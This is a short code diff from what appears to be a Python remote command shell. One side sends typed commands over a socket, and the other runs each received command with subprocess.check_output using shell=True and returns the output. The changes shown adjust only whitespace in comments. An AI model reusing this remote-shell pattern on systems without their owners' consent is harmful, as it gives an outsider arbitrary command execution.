@@ -23,8 +23,8 @@ while True:
 	## if you want to quit and close the connection
 	if cmd == "quit":
 		connection.send(b"quit") # send quit message in bytes
-		connection.close()	# close the connection
-		break				# break the loop to stop
+		connection.close()	 # close the connection
+		break			 # break the loop to stop
 		
 	connection.send(bytes(cmd, "utf-8")) 
 	
@@ -51,7 +51,7 @@ while True:
 	## if you want to quit and close the connection
 	if cmd == b"quit":
 		payload.close() # close the connection
-		break			# break the loop to stop
+		break		# break the loop to stop
 		
 	cmd = cmd.decode("utf-8")
 	output = subprocess.check_output(cmd, shell = True)
